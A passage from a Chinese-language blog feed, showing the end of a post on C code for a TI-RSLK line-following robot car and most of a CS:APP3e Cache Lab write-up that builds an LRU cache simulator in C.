        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xe0</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0xf0</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0xf8</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0xfc</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0xfe</span><span class="p">){</span>
            <span class="n">TurnLeftDegree</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">//直行小转弯右</span>
        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0x1</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0x2</span> <span class="o">||</span>  <span class="n">val</span><span class="o">==</span><span class="mh">0x3</span> <span class="o">||</span> <span class="n">val</span> <span class="o">==</span> <span class="mh">0x6</span> <span class="p">){</span>
            <span class="n">TurnRightDegree</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">//直行小转弯左</span>
        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0x40</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0x80</span> <span class="o">||</span> <span class="n">val</span><span class="o">==</span><span class="mh">0xc0</span> <span class="o">||</span> <span class="n">val</span> <span class="o">==</span> <span class="mh">0x60</span> <span class="p">){</span>
            <span class="n">TurnLeftDegree</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">//十字路口 orT字路口</span>
        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xff</span><span class="p">){</span>
            <span class="n">Forward</span><span class="p">();</span>
            <span class="n">delay</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
            <span class="n">val</span><span class="o">=</span><span class="n">LineSensor_Read</span><span class="p">(</span><span class="n">debug_time</span><span class="p">);</span>
            <span class="c1">// 0xff -&gt;T字路口</span>
            <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0x00</span><span class="p">){</span>
                <span class="n">Stop</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
                <span class="c1">//y遇到T字停止</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="c1">// 十字路口</span>
                <span class="n">Forward</span><span class="p">();</span>
                <span class="n">delay</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
                <span class="n">Stop</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="c1">// 断头</span>
        <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0x00</span><span class="p">){</span>
            <span class="n">Back</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="n">Forward</span><span class="p">();</span>
        <span class="p">}</span><span class="c1">// 直行</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Line Sensor State:%#x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">//读取传感器的数据</span>
<span class="kt">uint8_t</span> <span class="nf">LineSensor_Read</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">time</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">result</span><span class="p">;</span>
    <span class="c1">//P5.3输出高电平,打开红外发射管</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P5</span><span class="p">,</span><span class="n">GPIO_PIN3</span><span class="p">);</span>
    <span class="c1">//P7.0-7.7方向设置为输出</span>
    <span class="n">GPIO_setAsOutputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P7</span><span class="p">,</span><span class="n">PIN_ALL8</span><span class="p">);</span>
    <span class="c1">//设置P7.0-7.7输出高电平</span>
    <span class="n">GPIO_setOutputHighOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P7</span><span class="p">,</span><span class="n">PIN_ALL8</span><span class="p">);</span>
    <span class="c1">//延时10us</span>
    <span class="n">Delay_Nx1us</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
    <span class="c1">//P7.0-7.7方向设置为输入</span>
    <span class="n">GPIO_setAsInputPin</span><span class="p">(</span><span class="n">GPIO_PORT_P7</span><span class="p">,</span><span class="n">PIN_ALL8</span><span class="p">);</span>
    <span class="c1">//延时特定时间</span>
    <span class="n">Delay_Nx1us</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
    <span class="c1">//读取P7.0-7.7的输入值</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">P7</span><span class="o">-&gt;</span><span class="n">IN</span><span class="p">;</span>
    <span class="c1">//P5.3输出低电平,关闭红外发射管</span>
    <span class="n">GPIO_setOutputLowOnPin</span><span class="p">(</span><span class="n">GPIO_PORT_P5</span><span class="p">,</span><span class="n">GPIO_PIN3</span><span class="p">);</span>
    <span class="c1">//返回端口读取值</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Delay_Nx1us</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">time</span><span class="p">){</span>
    <span class="k">while</span><span class="p">(</span><span class="n">time</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">time</span><span class="o">--</span><span class="p">;</span><span class="c1">//空位操作判断时间</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
        <span class="n">__no_operation</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>]]></content><author><name></name></author><category term="西电相关"/><category term="项目"/><category term="c"/><category term="TI-RSLK"/><category term="嵌入式"/><summary type="html"><![CDATA[西电双创周小项目:自动循迹小车实现]]></summary></entry><entry><title type="html">CS:APP3e Cache Lab</title><link href="https://iamnotphage.github.io/blog/2022/CSAPP3eCache/" rel="alternate" type="text/html" title="CS:APP3e Cache Lab"/><published>2022-06-04T15:59:00+00:00</published><updated>2022-06-04T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/CSAPP3eCache</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/CSAPP3eCache/"><![CDATA[<p>在开始之前，先确保阅读CS:APPe3的第六章(尤其是<code class="language-plaintext highlighter-rouge">6.2</code>, <code class="language-plaintext highlighter-rouge">6.3</code>, <code class="language-plaintext highlighter-rouge">6.4</code>)</p> <p>(关于SRAM和DRAM部分的文字和我看过的国内教材神似，很难不怀疑是不是抄袭CSAPP的)</p> <p>然后就对高速缓存的结构有了新认识: (S, E, B, m)元组表示</p> <p>先阅读一下<code class="language-plaintext highlighter-rouge">writeup</code>发现有个内存调试工具<code class="language-plaintext highlighter-rouge">valgrind</code></p> <p>在docker运行的容器里面安装一下必要的内容(根据你的情况决定)</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yum <span class="nb">install </span>valgrind
yum <span class="nb">install </span>python2  <span class="c"># 后续./driver.py时是python2</span>
</code></pre></div></div> <h1 id="part-a">Part A</h1> <p>在<code class="language-plaintext highlighter-rouge">writeup</code>中给出了例子:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>root@5fd2dc6af315 cache]# ./csim-ref <span class="nt">-v</span> <span class="nt">-s</span> 4 <span class="nt">-E</span> 1 <span class="nt">-b</span> 4 <span class="nt">-t</span> traces/yi.trace
L 10,1 miss
M 20,1 miss hit
L 22,1 hit
S 18,1 hit
L 110,1 miss eviction
L 210,1 miss eviction
M 12,1 miss eviction hit
hits:4 misses:5 evictions:3
</code></pre></div></div> <p>我们的程序<code class="language-plaintext highlighter-rouge">csim.c</code>就是要模拟cache的机制，统计上述的输出信息。</p> <p>首先来剖析一下这个输入输出</p> <p>输入参数给定了(S, E, B, m) = (16, 1, 16, 64)</p> <p>(m = 64bit 假设是64位机器)</p> <p>所以地址分段应该是这样:</p> <table> <thead> <tr> <th>t</th> <th>s</th> <th>b</th> </tr> </thead> <tbody> <tr> <td>56</td> <td>4</td> <td>4</td> </tr> </tbody> </table> <p>所以这个cache有16组，每组1行，一行的数据块有16个。</p> <p>第一个操作<code class="language-plaintext highlighter-rouge">L 10,1 miss</code>因为cache为空，加载地址<code class="language-plaintext highlighter-rouge">0x10</code>时，第1组第0块没内容，所以miss</p> <p>miss之后，将内存<code class="language-plaintext highlighter-rouge">0x10</code>开始的内容加载到cache中</p> <p>接下来就是<code class="language-plaintext highlighter-rouge">M 20,1 miss hit</code>此时第二组仍然是空，所以miss，加载地址<code class="language-plaintext highlighter-rouge">0x20</code>开始的内容到cache中</p> <p>之后修改，所以hit</p> <p>后续同理……</p> <hr/> <p>对于编写<code class="language-plaintext highlighter-rouge">csim.c</code>有以下要求:</p> <ul> <li>开头注释标明姓名和ID</li> <li>不能有任何警告</li> <li>对于任意参数s,E,b都能正确工作</li> <li>忽略<code class="language-plaintext highlighter-rouge">trace</code>中的所有取指信息(<code class="language-plaintext highlighter-rouge">I</code>开头的)</li> <li>最后必须调用<code class="language-plaintext highlighter-rouge">printSummary()</code>统计信息</li> <li>在本实验中，您应假设内存访问已正确对齐，因此单次内存访问绝不会跨越块边界。有了这个假设，你就可以忽略 valgrind 跟踪中的请求大小。</li> </ul> <p>而且eviction要满足LRU</p> <p>这不就是leetcode的LRU题么</p> <p>输入来自<code class="language-plaintext highlighter-rouge">valgrind</code>的trace信息，以及s, E, b参数，模拟cache行为并统计信息</p> <p>在Part A开始之前，<code class="language-plaintext highlighter-rouge">writeup</code>有几个建议:</p> <ul> <li>可以先在小的trace文件进行debug</li> <li>推荐实现<code class="language-plaintext highlighter-rouge">-v</code>选项，毕竟方便debug</li> <li>推荐使用<code class="language-plaintext highlighter-rouge">getopt.h</code>来解析参数(一般shell程序用这个来解析args)</li> <li>每次数据加载 (L) 或存储 (S) 操作最多只能导致一次cache miss。数据修改操作 (M) 被视为加载然后存储到同一地址的操作。因此，一个 M 操作可能会导致两次缓存hits，或一次miss和一次hit加上一次可能的eviction。</li> </ul> <p>解析参数参考一下<code class="language-plaintext highlighter-rouge">getopt()</code>函数很容易写出</p> <p>这里重点考虑构造cache的数据结构。</p> <p>首先是<code class="language-plaintext highlighter-rouge">cacheRow</code>的数据结构，包含一个<code class="language-plaintext highlighter-rouge">valid bit</code>和一个<code class="language-plaintext highlighter-rouge">tag</code> 由于不关注<code class="language-plaintext highlighter-rouge">block</code>的内容本身，所以<code class="language-plaintext highlighter-rouge">block</code>可以省略。</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">hits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">misses</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">evictions</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="cm">/**
 * @brief This is a cache line, which line has a valid bit, tags and blocks.
 */</span>
<span class="k">struct</span> <span class="n">cacheRow</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">valid</span><span class="p">;</span>  <span class="cm">/** valid bit */</span>
    <span class="kt">int</span> <span class="n">tag</span><span class="p">;</span>    <span class="cm">/** tags */</span>
<span class="p">};</span>

<span class="cm">/**
 * @brief The cache.
 */</span>
<span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span> <span class="n">cache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</code></pre></div></div> <p>其次是需要考虑<code class="language-plaintext highlighter-rouge">LRU</code>算法，如果<code class="language-plaintext highlighter-rouge">E</code> &gt; 1的话，就要考虑组内eviction</p> <p>如何手搓<code class="language-plaintext highlighter-rouge">LRU</code>也是有各种各样的解法，这里采用双向链表:</p> <p>越靠近<code class="language-plaintext highlighter-rouge">dummyHead</code>的结点表示越常用，当需要eviction时，一般替换靠近<code class="language-plaintext highlighter-rouge">dummyTail</code>的结点。(详见leetcode的LRU缓存)</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * @brief A node for constructing a deque.
 */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">node</span><span class="p">{</span>
    <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">prev</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">next</span><span class="p">;</span>
<span class="p">}</span><span class="n">node</span><span class="p">;</span>

<span class="cm">/**
 * @brief A deque, consist of a dummy head and a dummy tail.
 */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">deque</span><span class="p">{</span>
    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">capacity</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">head</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">tail</span><span class="p">;</span>
<span class="p">}</span><span class="n">deque</span><span class="p">;</span>

<span class="cm">/**
 * @brief For each SET, we have a deque (2^s deques)
 */</span>
<span class="n">deque</span><span class="o">*</span> <span class="n">deques</span><span class="p">;</span>

<span class="cm">/**
 * @brief Add the node to head of a deque.
 *
 * @param[in] dq deque
 * @param[in] node node
 */</span>
<span class="kt">void</span> <span class="nf">addToHead</span><span class="p">(</span><span class="n">deque</span><span class="o">*</span> <span class="n">dq</span><span class="p">,</span> <span class="n">node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">node</span><span class="o">*</span> <span class="n">head</span> <span class="o">=</span> <span class="n">dq</span> <span class="o">-&gt;</span> <span class="n">head</span><span class="p">;</span>
    <span class="n">node</span> <span class="o">-&gt;</span> <span class="n">prev</span> <span class="o">=</span> <span class="n">head</span><span class="p">;</span>
    <span class="n">node</span> <span class="o">-&gt;</span> <span class="n">next</span> <span class="o">=</span> <span class="n">head</span> <span class="o">-&gt;</span> <span class="n">next</span><span class="p">;</span>
    <span class="n">head</span> <span class="o">-&gt;</span> <span class="n">next</span> <span class="o">-&gt;</span> <span class="n">prev</span> <span class="o">=</span> <span class="n">node</span><span class="p">;</span>
    <span class="n">head</span> <span class="o">-&gt;</span> <span class="n">next</span> <span class="o">=</span> <span class="n">node</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/**
 * @brief Remove a node from its deque.
 *
 * @param[in] node node
 */</span>
<span class="kt">void</span> <span class="nf">removeNode</span><span class="p">(</span><span class="n">node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">node</span> <span class="o">-&gt;</span> <span class="n">prev</span> <span class="o">-&gt;</span> <span class="n">next</span> <span class="o">=</span> <span class="n">node</span> <span class="o">-&gt;</span> <span class="n">next</span><span class="p">;</span>
    <span class="n">node</span> <span class="o">-&gt;</span> <span class="n">next</span> <span class="o">-&gt;</span> <span class="n">prev</span> <span class="o">=</span> <span class="n">node</span> <span class="o">-&gt;</span> <span class="n">prev</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/**
 * @brief Move a node to its deque's head.
 *
 * @param[in] dq deque
 * @param[in] node node
 */</span>
<span class="kt">void</span> <span class="nf">moveToHead</span><span class="p">(</span><span class="n">deque</span><span class="o">*</span> <span class="n">dq</span><span class="p">,</span> <span class="n">node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">removeNode</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
    <span class="n">addToHead</span><span class="p">(</span><span class="n">dq</span><span class="p">,</span> <span class="n">node</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/**
 * @brief Remove a tail from a deque.
 *
 * @param[in] dq deque
 *
 * @return the tail node
 */</span>
<span class="n">node</span><span class="o">*</span> <span class="nf">removeTail</span><span class="p">(</span><span class="n">deque</span><span class="o">*</span> <span class="n">dq</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">node</span><span class="o">*</span> <span class="n">res</span> <span class="o">=</span> <span class="n">dq</span> <span class="o">-&gt;</span> <span class="n">tail</span> <span class="o">-&gt;</span> <span class="n">prev</span><span class="p">;</span>
    <span class="n">removeNode</span><span class="p">(</span><span class="n">res</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>顺便实现几个API方便后续LRU调用</p> <p>那么接下来就考虑<code class="language-plaintext highlighter-rouge">cache</code>的初始化，需要初始化各个组的deque:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * @brief Initialize cache
 *
 * @param[in] s set bits
 * @param[in] E lines per line
 */</span>
<span class="kt">void</span> <span class="nf">initCache</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">E</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">sets</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">s</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span> <span class="n">cacheLines</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cacheRow</span><span class="p">)</span> <span class="o">*</span> <span class="n">sets</span> <span class="o">*</span> <span class="n">E</span><span class="p">);</span> <span class="c1">// 2^s * E lines of cache</span>

    <span class="n">cache</span> <span class="o">=</span> <span class="n">cacheLines</span><span class="p">;</span>

    <span class="n">deques</span> <span class="o">=</span> <span class="p">(</span><span class="n">deque</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">deque</span><span class="p">)</span> <span class="o">*</span> <span class="n">sets</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sets</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">node</span><span class="o">*</span> <span class="n">dummyHead</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">node</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">node</span><span class="p">));</span>
        <span class="n">node</span><span class="o">*</span> <span class="n">dummyTail</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">node</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">node</span><span class="p">));</span>
        <span class="n">dummyHead</span> <span class="o">-&gt;</span> <span class="n">offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">dummyTail</span> <span class="o">-&gt;</span> <span class="n">offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

        <span class="n">dummyHead</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">dummyTail</span><span class="p">;</span>
        <span class="n">dummyTail</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">dummyHead</span><span class="p">;</span>

        <span class="n">deques</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">head</span> <span class="o">=</span> <span class="n">dummyHead</span><span class="p">;</span>
        <span class="n">deques</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">tail</span> <span class="o">=</span> <span class="n">dummyTail</span><span class="p">;</span>
        <span class="n">deques</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">deques</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">capacity</span> <span class="o">=</span> <span class="n">E</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>对参数的提取就不多说了，利用<code class="language-plaintext highlighter-rouge">getopt</code>即可。</p> <p>然后是对<code class="language-plaintext highlighter-rouge">trace</code>每一行提取关键的信息，比如操作符<code class="language-plaintext highlighter-rouge">op</code>和<code class="language-plaintext highlighter-rouge">address</code>(hex format):</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * @brief The vital info about trace: operation and address.
 */</span>
<span class="k">struct</span> <span class="n">traceLine</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">op</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">address</span><span class="p">;</span>
    <span class="c1">// int block;</span>
<span class="p">};</span>

<span class="cm">/**
 * @brief Parse the trace line to get op and address.
 *
 * @param[in] line a line of trace info
 *
 * @return operation and address
 */</span>
<span class="k">struct</span> <span class="n">traceLine</span><span class="o">*</span> <span class="nf">parseTraces</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">line</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">' '</span><span class="p">)</span><span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">op</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 'L' for load, 'M' for modify, 'S' for store</span>
    <span class="kt">int</span> <span class="n">address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">char</span> <span class="n">hexAddr</span><span class="p">[</span><span class="mi">17</span><span class="p">];</span>  <span class="c1">// 存储十六进制地址，假设地址最多16位</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// 提取逗号之前的十六进制字符串</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">','</span> <span class="o">&amp;&amp;</span> <span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">hexAddr</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">hexAddr</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span> <span class="c1">// 确保字符串以 '\0' 结尾</span>

    <span class="c1">// 使用 strtol 将十六进制字符串转换为整数</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">endptr</span><span class="p">;</span>
    <span class="n">address</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strtol</span><span class="p">(</span><span class="n">hexAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">traceLine</span><span class="o">*</span> <span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">traceLine</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">traceLine</span><span class="p">));</span>
    <span class="n">res</span> <span class="o">-&gt;</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">-&gt;</span> <span class="n">address</span> <span class="o">=</span> <span class="n">address</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>那么最核心的就是模拟<code class="language-plaintext highlighter-rouge">cache</code>的行为了:</p> <ol> <li>通过<code class="language-plaintext highlighter-rouge">address</code>的<code class="language-plaintext highlighter-rouge">s</code>字段获取组号</li> <li>对该组的每一行检查是否直接<code class="language-plaintext highlighter-rouge">hit</code> (<code class="language-plaintext highlighter-rouge">valid</code>且<code class="language-plaintext highlighter-rouge">tag</code>相同)</li> <li>如果直接<code class="language-plaintext highlighter-rouge">hit</code>那么直接返回，如果没有，那么继续</li> <li>找出空的<code class="language-plaintext highlighter-rouge">cache</code>行，如果该组内无空行，根据<code class="language-plaintext highlighter-rouge">deque</code>和LRU算法筛选出一行</li> <li>对选中的这行进行初始化<code class="language-plaintext highlighter-rouge">valid</code>和<code class="language-plaintext highlighter-rouge">tag</code>（加载到<code class="language-plaintext highlighter-rouge">cache</code>）并将对应的结点加入到<code class="language-plaintext highlighter-rouge">deque</code></li> <li>检查加入到<code class="language-plaintext highlighter-rouge">deque</code>后是否超出容量(<code class="language-plaintext highlighter-rouge">E</code>)并修正</li> <li>需要注意的是如果操作符是<code class="language-plaintext highlighter-rouge">M</code>则表示<code class="language-plaintext highlighter-rouge">L</code> + <code class="language-plaintext highlighter-rouge">S</code>只需要在最后的时候多一次<code class="language-plaintext highlighter-rouge">hit</code>即可</li> </ol> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
 * @brief Simulate cache
 *
 * @param[in] line trace info
 * @param[in] s set bits
 * @param[in] E lines per set
 * @param[in] b block bits
 * @param[in] verbose verbose option
 */</span>
<span class="kt">void</span> <span class="nf">processCache</span><span class="p">(</span><span class="k">struct</span> <span class="n">traceLine</span><span class="o">*</span> <span class="n">line</span><span class="p">,</span> <span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">E</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">verbose</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">address</span> <span class="o">=</span> <span class="n">line</span><span class="o">-&gt;</span><span class="n">address</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">op</span> <span class="o">=</span> <span class="n">line</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">whichSet</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">tag</span> <span class="o">=</span> <span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">b</span><span class="p">);</span>
    <span class="n">deque</span><span class="o">*</span> <span class="n">dq</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">deques</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>

    <span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span> <span class="n">setStart</span> <span class="o">=</span> <span class="n">cache</span> <span class="o">+</span> <span class="n">index</span> <span class="o">*</span> <span class="n">E</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span> <span class="n">victimLine</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">node</span><span class="o">*</span> <span class="n">victimNode</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="c1">// Traverse the deque to find if cache hits</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">node</span><span class="o">*</span> <span class="n">n</span> <span class="o">=</span> <span class="n">dq</span><span class="o">-&gt;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span> <span class="n">n</span> <span class="o">!=</span> <span class="n">dq</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">;</span> <span class="n">n</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">cacheRow</span><span class="o">*</span> <span class="n">cacheLine</span> <span class="o">=</span> <span class="n">setStart</span> <span class="o">+</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">cacheLine</span><span class="o">-&gt;</span><span class="n">valid</span> <span class="o">&amp;&amp;</span> <span class="n">cacheLine</span><span class="o">-&gt;</span><span class="n">tag</span> <span class="o">==</span> <span class="n">tag</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Cache hit</span>
